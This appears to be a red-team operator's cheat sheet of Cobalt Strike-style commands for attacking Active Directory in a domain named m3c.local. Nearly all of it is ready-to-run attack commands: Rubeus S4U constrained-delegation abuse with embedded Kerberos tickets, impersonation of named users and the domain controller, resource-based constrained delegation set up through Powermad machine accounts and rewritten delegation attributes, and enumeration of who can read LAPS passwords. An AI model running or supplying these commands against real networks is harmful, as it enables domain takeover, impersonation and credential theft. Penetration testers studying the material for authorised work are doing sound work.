Contrained Delegation Exploit (S4U)

# Impersonate another user as a Servcie (IE. WinRM) 
    execute-assembly /opt/tools/CSharp_Tools/Compiled/SharpView.exe Get-DomainComputer -TrustedToAuth -Properties distinguishedname msds-allowedtodelegateto useraccountcontrol -Verbose | fl
    execute-assembly /opt/tools/CSharp_Tools/Compiled/SharpView.exe Get-DomainUser -TrustedToAuth -Properties distinguishedname msds-allowedtodelegateto useraccountcontrol -Verbose | fl

    execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe tgtdeleg
    execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /ticket:doIE9jCCBPKgAwIBBaEDAgEWooIEBTCCBAFhggP9MIID+aADAgEFoQsbCU0zQy5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTTNDLkxPQ0FMo4IDwzCCA7+gAwIBEqEDAgEEooIDsQSCA60qDQg2Sw6mZmDd8GSSutUhMDPh+DF2JJTb9KzQf3aslAVsCOYtPMVlTfWePgBG01Nw9G1wl/Rw1/ZptMO34kLT4isfXTJ+GFC7E490/Ev5oTIYkkGyr7CxCR4QPUk2yW3J6/5DYAr93HBC7COxGE3jGFtZMByfJXMcgziUSPrvSzhibzWavAzeZT1DGZHT4lH2J/DquKPMR399a34sdIYtWBon1YtqOowQqKzRdycZ6l3OaZv8gQpPxRu3cDNcuquxPLYqPsHgo36H9gVMEqpAlOl9UhuOG4rZXoaMn83G9r1k2JzlrjeVPKIaWuluOPCLz/jF4KZnAtGQfNco5uk80QCidvQnWt9HU6ZLJTSuoTgUKqzQIgnehh9cLrv9VNfjAYxDsx1SZUGA5Dzud/oo9VG4YTi3Cs2sxr5X2lebnLUdJzp8e8ghKKbK8fpCWbkYawmFgx3/++v/xxajyuYBzsz/36FeWHIkGETYAIQMLvAzF06KzvkJdZ+o7JZ/30+vajR/fyn9Gt/p5twhKBomNi21g3pUkhvVUZMtPzsqGap+0eSlS3xI/uTJBlnAuZiosDUnlBYPzEcOh/95Vd5tuqDwM9ZRvTWB2LeUP/rdrN1enzDMLu+FMwwacswwjLq0owONyGKOUCf4Nt91M60oeQRBQfqwCZn9ktduFxpjTN1Soja9/CijieHggwpmjHoh75SQ16WnbYDhRxOY5OCtSPtQn2zlUakg5Fh9GDPBmwOMiPQjOSBKbZ6DEzrivnCU/HJ+kuzQ5F359irAzhvLq9n7fLZB6dWgTTs0qOoQpn782zVYbVZSrShjosZI9jF+czxqlKINil2QT1NaAQ3i33/C7j2iM0a39Sw9K0wF2UccTV40b23qVQ48MlNyf8UmSsg8iUm+ankc5/FAmQgkZvEsDCEhMXWspNyGqUAqtT5oiG82FXnEpK7w/fl2/jSDK8aPuwwNLZYi6LRTkFkjIAN/Zr/n3NhGELU7PQ3dRD1eFcwb5qFk5cIRjEgKLi8MZqgbyqPuv6V3ZXshsoDtcwaB8HPTtolOBPgjKGfmYt7E4WIzwezTKojaAiGbU0FDQXgIZRkrcIzOcpDmE40FAdY3LKGtkfydMPKC29XB5pyat+hPo+Nf3flI/Bfuc7MNbVFRxqdRqsDq9JjLe6nCuBG70KC2ukLphIuCsnP6/k0N0s4L+fb4XlSF/g79qHHQh2cXCgs0+wnu573XN2dr4znHm3yuRnNfT4RlX6OB3DCB2aADAgEAooHRBIHOfYHLMIHIoIHFMIHCMIG/oCswKaADAgESoSIEIMU1W8DilBFLCUcZNpJ3vRlxZZz5lYWlUkoOxJXFAJJLoQsbCU0zQy5MT0NBTKIUMBKgAwIBAaELMAkbB3N2Y19zcWyjBwMFAGChAAClERgPMjAyMDA3MjExMzAzNDlaphEYDzIwMjAwNzIxMjIwMTU5WqcRGA8yMDIwMDcyODEyMDE1OVqoCxsJTTNDLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0GwlNM0MuTE9DQUw= /impersonateuser:DAVID.GAINES /domain:m3c.local /msdsspn:"time/m3webaw.m3c.local" /altservice:wsman /altservice:host /altservice:http /ptt
    powerpick Invoke-Command ??ComputerName m3webaw.m3c.local -ScriptBlock { hostname }


Generic Write Add New Machine

# Generic Write (Added New Machine Account)
    powershell-import /home/user/Dropbox/tools/post-exploit/windows/Powermad/Powermad.ps1
    powerpick New-MachineAccount -MachineAccount MYTESTCOMPUTER -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
## Specify OU
    powerpick New-MachineAccount -DistinguishedName "CN=test111,OU=Servers,OU=Computers,OU=m3c,DC=m3c,DC=local" -MachineAccount MYTESTCOMPUTER -Password $(ConvertTo-SecureString '1q2w3e!Q@W#E' -AsPlainText -Force)

    powershell-import /home/user/Dropbox/tools/post-exploit/windows/PowerSploit-dev/Recon/PowerView.ps1
    powerpick Get-DomainComputer MYTESTCOMPUTER -Properties objectsid | Select -Expand objectsid
    S-1-5-21-340507432-2615605230-720798708-3104
    powerpick $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$('###PUT THE SID HERER AND CHANGE COMPNAME AT END###'))"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer MYTESTCOMPUTER | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
    powerpick $RawBytes = Get-DomainComputer MYTESTCOMPUTER -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0; $Descriptor.DiscretionaryAcl
    execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe hash /password:Password123! /user:MYTESTCOMPUTER$ /domain:m3c.local

# Impersonate user or computer

    execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /user:MYTESTCOMPUTER$ /rc4:A6046AE491FEA36346D82E83A79777F7 /impersonateuser:M3DC$ /msdsspn:cifs/m3dc.m3c.local /ptt

# GenericWrite (Write Property to DC)

    # Change SID to user to want to grant permission and Get-DomainComputer)
    powerpick $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$('S-1-5-21-340507432-2615605230-720798708-1293'))"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer m3dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
    # Sets the property
    powerpick $RawBytes = Get-DomainComputer m3dc -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0; $Descriptor.DiscretionaryAcl
    # Verify the property
    powerpick Get-DomainComputer m3dc -Properties 'msds-allowedtoactonbehalfofotheridentity'
    # Execute (Run rubeus tgtdeleg to get ticket)
    execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /ticket:doIFFDCCBRCgAwIBBaEDAgEWooIEIDCCBBxhggQYMIIEFKADAgEFoQsbCU0zQy5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTTNDLkxPQ0FMo4ID3jCCA9qgAwIBEqEDAgEEooIDzASCA8hTbEtoTT0z8UA4M6A1daBjAP2XopFtEeUcMgkv+rmBCyuyqhRPLoaKcAYauqf5Yv9N4cY6e+w2EA02C32kT/ZDl9lui67qwG0U132g1+3zqKmHzJODyM0kHhFdvlL6Md6Ad/VnPOmaFzR0Ttfu5jmBpoK09goVGckiou3R13lVrvThL+XaSUP2bmJa4qv9S4+ze6r7D+Um2Nu27/8kkMIF7vu+LF1WuSaKqRbSMFtgIQBzBdtHyo6Kqh84dAUf54q5sNkM1Kry4RrtZhpgq1zYfuZigk1xjM0VCaBTXNg+cTsij2GPrciqAuaHIxbbIQvHv6QqZZ8PSZqCOmJfU4ENy3avQmYGUyBqMTCwJnM85nRWdzR0b+CFsw9LvKYajWGXX0qYuUVkYyznBy76zSbmjsc70ghN9JMnEXsjD7eIH+0sOCDvY02E6XOIG4d+bmOijEM0C9E8bdz61O+EbR4f3FmxhEaH/z0jkuywGWMECioR/4ktnhz1VmfdAofnY8ftpIbwoPbKKp9NYBwxpKAT1nCzsFOc+QWeNHWX1DZTBWBcIcT2Hr/XTxHSIk+70vsxkYqCMG7Pmr9AREIvZW/aAjhCFVOg2eh7UCZ7Lgc0HxU5bSTmJ/p+5/o6vFiWaxeRYU1vQAS6Quk4XqFhcJgdV1sQaxzOcPOZHQw/FOFyTGebpnqrRg5vAeUp4Jx9A+LR9NxgjnQ7bql5rRQl51aKDBX6b/6eNo2iS4nTtApvZlbv5uR84CSKuGuEpf/Wcpm/4kO1Yc1xlyTw5UBpJAI5jlev52J6I16fKVgz9IqSHBsbFv7wBtimnWF5O/IzVa+OAjLIBFDF5R8hK5kusrcENlFeGsq+Kw9310qdacXcvMaE+w5uCbYhP48zRNthWa+MIJUS+GSxOgBXDyaXK9jTEPIw8P1edvCkR/3PfRaV72hxMgnS+M2eQ5R0zL442ZDl2GK0J5vTXoAfwK0WmmREDo/gygKpnZ9JZWIK9N35tIrGC7kpAGEfFtwsy0novU2uArgt+XzbHKVbi/1i4Rlcrj1Ba8H198Y5+QJNuG1CNBcQBsKbThxH/3p4PbvaQcZCRbXfNN9N/1OhJWyW76ZU+8oOJDQHHxCLu4K1fHcViOhFz4ZGtxrn09zCZzg6CepITxM5CGCNjL+Yu5YBZ6kuLpLlMN8Q0ophkXZXE7pDaU6eIi9sv+9AcvmEOiI1j99/owgoAFY1NHaIXjQkqW0sctgvoK8vdjwMja3B0e5sCek6EPz9u6SoJQ4l+daBwLuZfPCGRVmfYKOB3zCB3KADAgEAooHUBIHRfYHOMIHLoIHIMIHFMIHCoCswKaADAgESoSIEIL0hgn35WC3hZOiNcT1o7FdjaNXmhErSizZpIEUgmWO6oQsbCU0zQy5MT0NBTKIXMBWgAwIBAaEOMAwbCnN2Y19hcGFjaGWjBwMFAGChAAClERgPMjAyMDA3MjQxMjMwMjhaphEYDzIwMjAwNzI0MjIwMjA4WqcRGA8yMDIwMDczMTEyMDIwOFqoCxsJTTNDLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0GwlNM0MuTE9DQUw= /impersonateuser:kenneth.kea /domain:m3c.local /msdsspn:cifs/m3dc.m3c.local /altservice:ldap /ptt


# Who can view LAPS Passwords (Chanage -Computername)

    execute-assembly /opt/tools/CSharp_Tools/Compiled/SharpView.exe Get-NetComputer -ComputerName 'M3WEBAW.M3C.LOCAL' -FullData | Select-Object -ExpandProperty distinguishedname | ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach-Object {Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_} | Where-Object {($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {Convert-NameToSid $_.IdentityReference} | Select-Object -ExpandProperty SID | Get-ADObject


# Enumeration via PowerView
    View Applocker Policy
    powerpick Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

    Find all share on a a domain
    powershell Find-DomainShare -ComputerDomain cyber.local

    Get AD ACL Permissions on a target (samccountname=target; securityidentifier=user)
    powerpick get-objectacl -samaccountname corewkt002 -resolveguids | where-object {$_.SecurityIdentifier -eq 'S-1-5-21-1559563558-3652093953-1250159885-1103'}
